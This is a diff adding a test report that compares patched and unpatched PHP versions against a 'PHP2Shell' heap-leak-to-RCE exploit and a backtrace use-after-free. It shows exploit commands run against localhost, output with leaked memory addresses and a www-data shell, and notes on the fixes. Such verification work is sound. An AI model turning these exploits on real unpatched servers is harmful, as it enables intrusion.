@@ -1,0 +1,49 @@
+============================================================
+ PHP2Shell - Patched vs Unpatched Comparison
+ Date: 22 October 2026
+============================================================
+
+TEST MATRIX:
+  ┌────────────┬───────────────┬─────────────┬──────────┐
+  │ Version    │ Heap Leak     │ RCE         │ Status   │
+  ├────────────┼───────────────┼─────────────┼──────────┤
+  │ PHP 8.4.26 │ ✅ 4096 bytes │ ✅ uid=33   │ VULN     │
+  │ PHP 8.4.27 │ ❌ Failed     │ ❌ N/A      │ PATCHED  │
+  │ PHP 8.5.11 │ ✅ Bug 3 UAF  │ ❌ (PoC)    │ VULN     │
+  │ PHP 8.5.12 │ ❌ Failed     │ ❌ N/A      │ PATCHED  │
+  └────────────┴───────────────┴─────────────┴──────────┘
+
+PHP 8.4.26 (VULNERABLE):
+  $ python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/
+  [+] Zend MM chunk base = 0x7242f2400000
+  [+] libphp base = 0x7242f40d1000
+  PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+PHP 8.4.27 (PATCHED):
+  $ python3 exploit/php2shell_exploit.py -u http://127.0.0.1:9080/
+  [-] Heap leak basarisiz
+  [-] Heap leak basarisiz
+  [-] Heap leak basarisiz
+
+PHP 8.5.11 (Bug 3 UAF - VULNERABLE):
+  $ python3 exploit/bug3_backtrace_uaf.py --port 8080
+  [!!] UAF candidate at round 3: consumer connection reset
+  === Valgrind ===
+  definitely lost: 328 bytes in 2 blocks
+
+PHP 8.5.12 (PATCHED):
+  $ python3 exploit/bug3_backtrace_uaf.py --port 8080
+  [-] no crash observed (50 rounds)
+  Valgrind: 0 bytes definitely lost
+
+PATCH ANALYSIS:
+  PHP 8.4.27 fix (session handler):
+    - Adds proper cleanup of PS(http_session_vars) in fast_shutdown path
+    - Ensures session RSHUTDOWN runs even after OOM bailout
+    - Nullifies the stale reference before heap deallocation
+
+  PHP 8.5.12 fix (backtrace handler):
+    - Adds UNCONDITIONAL ZVAL_UNDEF(&EG(last_fatal_error_backtrace))
+      at end of shutdown_executor()
+    - Runs in BOTH fast_shutdown and full-cleanup paths
+    - Prevents stale reference from surviving to next request
